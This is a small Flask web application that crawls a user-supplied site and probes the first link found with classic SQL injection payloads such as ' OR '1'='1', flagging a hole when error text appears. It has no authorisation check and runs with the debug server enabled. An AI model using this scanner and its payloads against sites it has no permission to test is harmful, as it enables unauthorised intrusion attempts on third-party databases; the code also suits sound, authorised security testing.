from flask import Flask, render_template, request
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# List of SQL Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
]

# Function to send HTTP requests and get a response
def send_request(url, payload=None):
    try:
        if payload:
            response = requests.get(url, params=payload, timeout=5)
        else:
            response = requests.get(url, timeout=15)
        return response
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
        return None

# Function to crawl and find all links on the website
def crawl_website(url):
    try:
        response = send_request(url)
        if response is None:
            return []
        
        soup = BeautifulSoup(response.text, 'html.parser')
        links = []

        # Extract all <a> tags
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            if href.startswith('/'):
                href = url + href  # Handle relative URLs
            if url in href:  # Ensure link belongs to the target website
                links.append(href)

        return list(set(links))  # Remove duplicates
    except Exception as e:
        print(f"Error during crawling: {e}")
        return []

# Function to test for SQL injection vulnerabilities
def test_sql_injection(url, params):
    sql_results = []
    vulnerable = False

    for payload in SQL_PAYLOADS:
        # Inject payload into parameters
        for param in params:
            test_params = params.copy()
            test_params[param] = payload
            response = send_request(url, payload=test_params)
            if response and ("SQL" in response.text or "syntax" in response.text):
                sql_results.append(f"Vulnerability found with payload: {payload}")
                vulnerable = True
                break
        if vulnerable:
            break

    if not vulnerable:
        sql_results.append("No SQL Injection vulnerability detected.")
    
    return sql_results

@app.route('/', methods=['GET', 'POST'])
def index():
    sql_results = []
    links = []

    if request.method == 'POST':
        target_url = request.form['url']
        links = crawl_website(target_url)

        if links:
            sql_results = test_sql_injection(links[0], {"id": "1"})  # Testing first link for SQL Injection

    return render_template('index.html', sql_results=sql_results, links=links)

if __name__ == "__main__":
    app.run(debug=True)
